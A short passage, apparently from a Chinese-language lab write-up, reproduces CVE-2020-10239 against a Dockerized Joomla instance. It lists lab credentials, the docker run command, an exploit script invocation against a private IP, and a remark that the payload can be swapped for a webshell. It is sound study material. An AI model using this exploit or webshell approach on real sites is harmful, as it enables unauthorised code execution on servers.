...
MySQL: root: root \(can access via IP:8080/phpmyadmin\) superadmin:1234 \(超级用户权限\) admin:1234 \(管理员权限\) hacker:1234 \(管理权限\)
...
docker run -dit --rm -p 3000:80 hoangkien1020/joomla:hk
```

RCE.py\(位于125行处代码，我们也可以使用生成webshell代替原本payload，实现更便捷的webshell获取\)
...
```text
python cve-2020-10239.py -url http://192.168.20.24:3000 -u admin -p 1234
```

![image-20210803164413455](../.gitbook/assets/image-20210803164413455.png)

访问目标shell

![image-20210803164537276](../.gitbook/assets/image-20210803164537276.png)
